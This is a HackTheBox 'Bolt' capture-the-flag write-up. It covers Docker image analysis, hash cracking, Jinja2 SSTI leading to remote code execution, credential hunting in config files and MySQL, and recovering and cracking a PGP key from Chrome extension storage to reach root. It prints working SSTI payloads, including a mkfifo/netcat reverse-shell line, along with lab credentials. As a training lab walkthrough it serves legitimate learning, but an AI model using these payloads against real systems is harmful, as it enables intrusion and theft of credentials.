@@ -1,0 +1,325 @@
+---
+title: "Bolt Hackthebox writeup"
+author: "0xMesbaha"
+cover: "/media/Bolt/start.png"
+tags: ["Hackthebox", "SSTI" , "PGP Decrypting"]
+date: 2022-02-18T00:45:12+02:00
+draft: false
+---
+
+
+In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost "demo" which has some functions aren't in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .
+
+<!--more-->
+
+
+## Scanning :
+
+```bash
+$ nmap -A -T 4 $IP  -sV -oN nmap/intial
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
+|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
+|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
+80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title:     Starter Website -  About
+443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-title: Passbolt | Open source password manager for teams
+|_Requested resource was /auth/login?redirect=%2F
+| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Not valid before: 2021-02-24T19:11:23
+|_Not valid after:  2022-02-24T19:11:23
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+- if we do a full port scan it won't return any new ports so now we can start our enumeration process.
+
+- we can notice from the nmap scan`` commonName=passbolt.bolt.htb`` so we can add
+``bolt.htb`` and ``pass.bolt.htb `` to our ``/etc/hosts``
+
+- we can also search for other potential vhosts  now :
+
+```bash
+ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://bolt.htb -H "Host: FUZZ.bolt.htb" -fw  10870
+
+mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]
+demo                    [Status: 302, Size: 219, Words: 22, Lines: 4]
+```
+
+- we can add them all to the ``/etc/hosts`` as well
+
+
+
+## Enumeration :
+
+- visiting the web application at ``bolt.htb`` or ``passbolt.bolt.htb`` we are introduced with  :
+
+![error](/media/Bolt/20220224093240.png)
+
+- there is a feedback form at the end but it doesn't work
+- we can start viewing the pages at the application  :
+
+![error](/media/Bolt/20220224093405.png)
+
+- at ``/download`` there is a file we can download so let's download it and see what it contains
+
+![error](/media/Bolt/20220224093429.png)
+
+- extracting the ``image.tar`` we can see it contains :
+
+![error](/media/Bolt/20220224093713.png)
+
+- each directory contains a ``layer.tar `` file , we can utilize some bash magic to extract them all :
+
+```bash
+#!/usr/bin/bash
+for file in $( ls -d */)
+do
+tar -xf  $file/layer.tar -C $file/
+done
+```
+
+- now  we can use ``tree`` command to have an overview what does the files contains then we can start checking them manually
+
+![error](/media/Bolt/20220224100331.png)
+
+
+at ``745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/`` will find a ``config.py`` file
+
+- reading it will find  :
+
+![error](/media/Bolt/20220224100409.png)
+
+- and it loads  ``db.sqlite3 ``  we can start searching for it in all image layers maybe we find it and we did :
+
+```bash
+# under img dir
+find . -name db.sqlite3
+./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
+```
+
+- now we can open it and will find :
+
+![error](/media/Bolt/20220224100831.png)
+
+```
+admin@bolt.htb:$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
+```
+
+we can try to crack this hash with JTR :
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt admin@bolt.htb_hash
+# password:deadbolt
+```
+
+great we have credentials we can try to login at the web application with it and we are in:
+
+![error](/media/Bolt/20220224101458.png)
+
+- let's see where else we can utilize these valid credentials , we can visit ``mail.bolt.htb `` but it didn't work :( .
+- we can also visit ``demo.bolt.htb`` and it also doesn't work however it contains a registration function :
+- it needs a ticket to create an account
+
+![error](/media/Bolt/20220224102126.png)
+
+- navigating through img files will see at ``41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/`` some source codes we can check ``routes.py`` and we will see :
+
+![error](/media/Bolt/20220224103501.png)
+
+- seems like invitation code we can try to register at ``demo.bolt.htb`` with it .
+- we create account successfully and can login with it :
+
+![error](/media/Bolt/20220224103833.png)
+
+- we can also login to ``mail.bolt.htb `` with our new credentials , they seem to be connected somehow
+
+![error](/media/Bolt/20220224103947.png)
+
+## Enumeration Harder
+
+- now as we are logged in in all the web applications we should have notice that ``demo.bolt.htb`` and ``bolt.htb``  are pretty much the same however in the ``demo`` there are more features and pages we can access .
+-  we now are searching for any input at any page to test it
+-  at demo and under profile page we have this setting tab which has input option :
+
+![error](/media/Bolt/20220224104439.png)
+
+- we can test it
+
+![error](/media/Bolt/20220224104528.png)
+
+- and instantly at ``mail.bolt.htb`` an email has received
+
+
+![error](/media/Bolt/20220224104619.png)
+
+- and when we pressed the link another mail has received :
+
+![error](/media/Bolt/20220224104701.png)
+
+- so now we have understood how the web applications function together we can test these input fields for potential vulnerabilities .
+- we have seen in the source codes "flask" a lot so we can test [SSTI](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) .
+
+
+
+## exploitation :
+
+testing SSTI can began with a basic test like :
+
+![error](/media/Bolt/20220224105201.png)
+
+- we now will receive first mail to confirm and 2nd one with the response :
+
+![error](/media/Bolt/20220224105326.png)
+
+- Nice we have a valid SSTI exploit at the name field , we can try to leverage it to RCE  with payload like [those](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
+
+```bash
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
+```
+
+response :
+
+![error](/media/Bolt/20220224105554.png)
+
+so now we can get a reverse shell with :
+
+```bash
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 9999 >/tmp/f').read() }}
+```
+
+
+## Foothold :
+
+and we have our shell as www-data  :
+
+![error](/media/Bolt/20220224105825.png)
+
+- if we look around we will find a lot of files to explore , we can use **Linpeas** to guide us where to look first and non expected files in some directories and if there is a path to escalate our privilege .
+
+- we can check  ``roundcube/config/config.inc.php`` and will find :
+
+![error](/media/Bolt/20220224120011.png)
+
+ which is a potential password we can use latter
+
+- also there is ``/etc/passbolt`` we can check it  
+- to search for potential passwords in it we can use :
+
+```bash
+grep --color=auto -rnw '.' -Rie "password" --color=always 2>/dev/null
+# ./passbolt.php:42:            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
+```
+
+![error](/media/Bolt/20220224114429.png)
+
+we can try to see if we can access the mysql database :
+```
+passbolt:rT2;jW7<eY8!dX8}pQ8%
+```
+```bash
+www-data@bolt:/etc/passbolt$ mysql -u passbolt -D passboltdb -p
+# mysql>
+```
+
+- and we have connected successfully , we can now see if there is anything interesting for us
+
+```bash
+mysql > SHOW databases ; # list them
+mysql > use passboltdb;
+mysql > show tables; # list tables
+mysql > Describe secrets ; # found table secrets seems interesting
+```
+
+- will find this PGP message inside the column data of table secrets :
+
+![error](/media/Bolt/20220224115251.png)
+
+- so far we didn't find a potential factor to escalate to ``eddie`` or ``clarck``
+- however we have collected some passwords we can test them as ssh credentials with any user .
+
+
+## Eddie user :
+
+![error](/media/Bolt/20220224120424.png)
+
+- now we can ssh to the eddie user :
+
+
+![error](/media/Bolt/20220224120528.png)
+
+- Back to our linpeas output we had  :
+
+![error](/media/Bolt/20220224121919.png)
+
+- and he had one mail from clark contains :
+
+![error](/media/Bolt/20220224122018.png)
+
+```
+Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it
+```
+
+- so we should search for this browser to see what is this mail about
+- we can find google-chrome is the browser mentioned
+
+![error](/media/Bolt/20220224122359.png)
+
+- now we want to get eddie private key to be able to read the message we have seen before in the MySQL DB .
+- we can start searching for it inside the chrome folder we just hit .
+
+```bash
+eddie@bolt:~/.config/google-chrome$ grep "PRIVATE KEY" -r .
+```
+
+will find some results just have the header and not the key itself  , but will find :
+
+```
+Binary file ./Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
+```
+
+seems promising , now to grep in a binary you should use  "-a" which means all even binaries .
+
+![error](/media/Bolt/20220224123711.png)
+
+and here it is now you can copy it then replace "\r\n" with new line and you now have the private key
+
+![error](/media/Bolt/20220224123755.png)
+
+### Decrypting the message
+
+now to decrypt  a PGP encrypted message we will use :
+
+```bash
+$ gpg --import eddie_private
+$ gpg -d message.inc
+```
+
+but it asks for a passphrase to import the gpg key
+
+![error](/media/Bolt/20220224124020.png)
+
+- we can utilize **gpg2john** to get the hash then **john**  to crack it
+
+```bash
+$ gpg2john eddie_private > eddie_key_hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt eddie_key_hash
+```
+
+
+![error](/media/Bolt/20220224124928.png)
+
+- now we can decrypt the message :
+
+![error](/media/Bolt/20220224125124.png)
+
+
+## Root Access
+
+using the password we just found in the message : ``Z(2rmxsNW(Z?3=p/9s``  we get the root access
+![error](/media/Bolt/20220224125233.png)
